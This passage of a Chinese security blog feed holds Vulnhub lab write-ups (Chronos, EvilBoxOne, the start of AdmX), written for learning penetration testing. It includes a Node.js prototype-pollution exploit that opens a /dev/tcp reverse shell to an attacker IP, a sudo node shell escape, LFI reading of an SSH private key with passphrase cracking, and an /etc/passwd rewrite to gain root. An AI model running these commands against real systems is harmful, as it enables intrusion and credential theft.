res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
<p>信息收集差不多，那么接下来就是要提权了。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>Linux提权常用的三种方式：</p>
<ol type="1">
<li>内核漏洞</li>
<li>suid提权</li>
<li>sudo配置不当提权</li>
</ol>
<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
<p>提权成功。</p>
<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
<p>至此，渗透过程结束。</p>
<h1 id="彩蛋部分">彩蛋部分</h1>
<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
<h1 id="总结">总结</h1>
<p>通过对这个靶机的渗透，有以下几点感受：</p>
<ol type="1">
<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
<li>学习了第三种Linux提权的方式</li>
<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>node.js原型链污染</tag>
        <tag>nc串联</tag>
      </tags>
  </entry>
  <entry>
    <title>6 Vulnhub EvilBoxOne Writeup</title>
    <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度介于简单和中等之间。不过还是能够学到很多知识。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/evilbox-one,736/">evilbox_one</a></p>
<p>难度：Easy/Medium (Intermediate)</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>强制访问（路径爆破）</li>
<li><strong>参数爆破</strong></li>
<li>文件包含</li>
<li>PHP封装器（伪协议）</li>
<li>任意文件读取</li>
<li><strong>SSH公钥登录</strong></li>
<li><strong>离线密码破解</strong></li>
<li>系统权限漏洞利用</li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击机kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: 显示可ping通的目标</span><br><span class="line">-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码</span><br><span class="line">-q: 安静模式(不显示每个目标或每个ping的结果)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
<p>靶机的IP为：10.0.2.9</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
<p>靶机打开了两个端口：22和80</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A 等价于 -sV -sC -O 的组合</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
<ul>
<li>22端口的服务为ssh，这里其实可以尝试爆破</li>
<li>80端口的服务为http，CMS是Apache2，版本为2.4.38</li>
<li>靶机操作系统为Debian</li>
<li>系统内核版本为 4.x或者5.x，该工具猜测为4.15-5.6</li>
<li>其他信息</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
<p>发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用<strong>参数爆破</strong>。</p>
<h2 id="参数爆破">参数爆破</h2>
<p>参数爆破时，参数值一般有两种情况：</p>
<ol type="1">
<li>数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；</li>
<li>网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值</li>
</ol>
<p>先尝试第一种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）</span><br></pre></td></tr></table></figure></p>
<p>发现没有任何结果。那么接下来尝试第二种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替</span><br></pre></td></tr></table></figure></p>
<p>（这里因为<code>secret</code>目录下的<code>index.html</code>内容为空，所以使用网站目录下的<code>index.html</code>）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
<p>此时爆出一个参数名 command。我们用浏览器验证一下。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>（Linux中 <code>cd ..</code> 是返回上一级目录，如果<code>cd ../../../../../</code>返回五次上级目录，如果不够5次，那就返回到根目录则停止。）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
<p>发现确实存在<strong>文件包含漏洞</strong>。</p>
<h2 id="文件包含漏洞利用">文件包含漏洞利用</h2>
<p>文件包含漏洞的利用一般有以下几种：</p>
<ol type="1">
<li>如果存在<strong>远程文件包含</strong>，则可以在自己的主机写一句话，然后让靶机包含该文件；</li>
<li>如果不存在<strong>远程文件包含</strong>，利用伪协议往靶机写入一句话；</li>
<li>如果前两者都不行，那么就利用伪协议进行信息收集；</li>
</ol>
<h3 id="远程文件包含">远程文件包含</h3>
<p>先验证是否存在远程文件包含，随便在kali上写一个文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
<p>然后开启http服务（先用浏览器访问一下是否成功开启）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
<p>最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。</p>
<h3 id="伪协议写文件">伪协议写文件</h3>
<blockquote>
<p>php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello world经过base64编码：aGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
<p>访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
<p>发现并没有写入成功，因此证明没有写文件的权限。</p>
<h3 id="伪协议信息收集">伪协议信息收集</h3>
<p>可以先读取<code>evil.php</code>的内容。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
<p>将得到的结果base64解码后得到： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这也说明了该文件确实存在<strong>文件包含漏洞</strong>。</p>
<h2 id="边界突破get-shell">边界突破（GET SHELL）</h2>
<h3 id="ssh爆破">SSH爆破</h3>
<p>从之前的信息收集发现有两个账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>因此尝试对这两个账号进行密码爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
<p>发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。</p>
<h3 id="ssh私钥泄露ssh公钥登录">SSH私钥泄露（SSH公钥登录）</h3>
<p>本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用<strong>文件包含漏洞</strong>来读取私钥。</p>
<p><strong>第一步，先判断以下靶机是否支持SSH公钥登录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
<p>注意箭头指向的那句话，说明<code>mowree</code>存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get shell）</p>
<p><strong>第二步，读取公钥和私钥的信息</strong></p>
<blockquote>
<p>如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置 公钥：<code>/home/username/.ssh/authorized_keys</code>（可以看到加密算法） 私钥：<code>/home/username/.ssh/id_rsa</code>（如果加密算法为rsa的话）</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>查看页面源码的格式比较好看（注意格式不要改变）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p><strong>第三步，利用私钥登录</strong></p>
<p>将私钥写入到一个文件，然后执行下面命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># 文件名可以任意</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
<hr />
<p><strong>提示</strong>：</p>
<p>不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
<hr />
<p>使用私钥登录发现还需要输入一个<code>passphrase</code>。</p>
<blockquote>
<p>公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。 可以使用密码爆破。有hashcat， john等工具</p>
</blockquote>
<p>先将 id_rsa 进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># 将字典和hash放到同一目录</span></span><br><span class="line"></span><br><span class="line">爆破结果：unicorn</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
<p>再次利用SSH公钥登录 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. 输入密码：unicorn</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
<p>成功get shell！</p>
<h2 id="权限提升">权限提升</h2>
<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span></span><br></pre></td></tr></table></figure></p>
<p>要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。</p>
<p>这里介绍一个新的提权思路：<strong>查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）</strong>。</p>
<p>利用下述命令寻找拥有写权限的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看</span><br><span class="line"></span><br><span class="line">2: 表示标准错误</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: 重定向</span><br><span class="line">/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。</span><br></pre></td></tr></table></figure></p>
<p>此时注意到这么一个文件：<code>/etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
<p>这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！</p>
<blockquote>
<p>小知识：<code>/etc/passwd</code>里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在<code>/etc/shadow</code>（这文件普通用户连读权限都没有）。但是，优先级是<code>/etc/passwd</code>优先，也就是如果<code>/etc/passwd</code>里面密码字段保存了密码，那么<code>/etc/shadow</code>中的密码就会失效！</p>
</blockquote>
<p>接下来的思路很明确了，修改<code>/etc/passwd</code>中root的密码字段，然后直接用<code>su -</code>命令切换。（也可以直接添加一条记录<code>echo "root2:加密密码:0:0:root:/root:/bin/bash"</code>，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥 有root权限。）</p>
<p>生成密码的加密密文： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 root <span class="comment"># -1 某种加密算法</span></span><br><span class="line"></span><br><span class="line">明文：root</span><br><span class="line">密文：$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
<p>（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - 或者 su root <span class="comment"># 登录root</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
<p>成功登录。</p>
<p>第一个flag在<code>/home/mowree/user.txt</code>，第二个flag在<code>/root/root.txt</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
<p>到此，本台靶机的渗透结束。</p>
<h2 id="验证操作">验证操作</h2>
<p>发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091627.png" /></p>
<p>但是，如果改了<code>mowree</code>的密码，则可以直接使用ssh的密码登录。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091712.png" /></p>
<h1 id="总结">总结</h1>
<p>对该靶机的练习，学到了许多东西。</p>
<p>在web方面，除了之前的路径爆破之外，还了解到了<strong>参数爆破</strong>。已经<strong>文件包含漏洞的利用</strong>。在权限提升和反弹shell上，学到了<strong>SSH爆破</strong>和<strong>SSH公钥登录</strong>，还有这其中使用的一些小工具。</p>
<p>还有一些Linux的小知识，比如可以多返回几次上一级目录，以及<code>find</code>命令的基本使用等。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SSH公钥登录</tag>
        <tag>参数爆破</tag>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Vulnhub AdmX writeup</title>
    <url>/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
